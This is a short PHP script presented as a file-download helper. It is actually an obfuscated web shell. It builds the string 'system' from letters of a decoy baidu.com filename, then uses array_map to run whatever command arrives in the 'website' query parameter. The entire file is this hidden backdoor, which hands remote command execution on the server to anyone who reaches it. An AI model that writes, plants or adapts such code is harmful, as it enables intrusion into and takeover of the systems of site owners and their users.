<?php
function downloadFile($url,$x){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    $exec1=substr($ext[0],1,1);
    $exec2=substr($ext[0],-1,1);
    $exec3=substr($ext[0],5,1);
    $exec4=substr($ext[0],8,1);
    $exec5=substr($ext[0],-11,1);
    $exec6=substr($ext[0],-5,1);
    $as[0] = $exec1 . $exec2 . $exec3 . $exec4 .$exec5 .$exec6;
    $as[1] = $x;
    return $as;
}
$a = $_GET['website'];
$s  = downloadFile('http://www.baidu.com/ysdaesfrtamgaly.txt',$a);
$b = $s[0];
$c = $s[1];
array_map($b,array($c));